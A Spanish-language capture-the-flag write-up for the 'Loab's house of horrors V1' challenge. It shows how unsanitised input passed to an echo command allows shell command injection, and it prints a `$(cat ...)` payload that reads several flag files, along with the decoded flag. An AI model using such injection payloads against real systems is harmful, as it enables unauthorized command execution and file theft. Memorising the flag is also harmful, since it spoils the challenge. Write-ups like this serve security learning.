# Loab's house of horrors V1.

Descomprimimos el zip y vemos un Dockerfile y código fuente escrito en python:

![loab1](https://github.com/user-attachments/assets/db52ce43-9e71-4d43-ab44-c9c8ca516e5e)

El programa acepta dos entradas de usuario, si somos muy lentos se termina:
```
You have entered the house of horrors. You will be presented with a series of challenges.
If you complete them all, you will be rewarded with the flag.
If you fail, you will be trapped here forever.
Who dares enter my realm: 

    Get comfortable. You will be here forever.
    Cg==

    Your mother was a hamster and your father smelt of elderberries.

            Is that it? Pitiful.

```

En 'welcome.py' vemos las posibles localizaciones de la flag:

![loab2](https://github.com/user-attachments/assets/2b6217e4-f59e-48e8-9689-e2df26b67262)

![loab3](https://github.com/user-attachments/assets/47c4c2a2-23f2-4394-98fc-7b52af356926)

Se usa un número aleatorio para elegir el lugar de la flag, pero la semilla siempre es la misma:

![bl1](https://github.com/user-attachments/assets/f8f5e42f-4d5c-4984-870d-add36d1ad9f8)

![bl2](https://github.com/user-attachments/assets/887811b7-3180-4fee-81e4-e723844d18db)

Nuestra entrada es directamente escrita luego del comando echo, y por lo tanto podemos usar expansiones de comandos con '$' o cerrar el echo con ';'

![blfn](https://github.com/user-attachments/assets/fc42f16e-046b-41da-ac10-99eaef3c4c19)

En la segunda entrada hay un intento de seguridad, pero igualmente se ejecutará el comando en la terminal:

![loabs4](https://github.com/user-attachments/assets/5dfc0c03-bbc0-4ad5-8b29-dc70d6d64b57)

Entonces podemos revisar todas las posibles localizaciones con: `$(cat /tmp/singularity; cat /tmp/abyss ; cat /tmp/orphans; cat /home/council; cat /tmp/.boom; cat /home/victim/.consortium;  cat /usr/bnc/.yummyarbs; cat /tmp/.loab; cat /tmp/loab)`

Nos devuelve una cadena en base64: **TklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9Cg==**

```

    You have entered the house of horrors. You will be presented with a series of challenges.
    If you complete them all, you will be rewarded with the flag.
    If you fail, you will be trapped here forever.
    Who dares enter my realm: $(cat /tmp/singularity; cat /tmp/abyss ; cat /tmp/orphans; cat /home/council; cat /tmp/.boom; cat /home/victim/.consortium;  cat /usr/bnc/.yummyarbs; cat /tmp/.loab; cat /tmp/loab)

	Get comfortable. You will be here forever.
TklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9Cg==
	
Your mother was a hamster and your father smelt of elderberries.

	Is that it? Pitiful.

	TOO SLOW - GOODBYE

```

La decodificamos y obtenemos la flag:

`NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`



